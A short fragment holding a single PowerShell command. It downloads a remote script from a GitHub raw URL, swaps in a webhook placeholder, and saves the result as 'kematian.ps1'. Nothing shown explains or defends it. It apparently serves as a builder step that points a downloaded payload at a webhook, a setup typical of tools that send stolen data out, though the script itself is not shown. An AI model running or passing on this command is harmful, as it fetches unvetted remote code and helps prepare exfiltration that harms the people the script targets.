...
powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/grumach/same/main/output.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | Out-File -FilePath 'kematian.ps1' -Encoding ASCII"
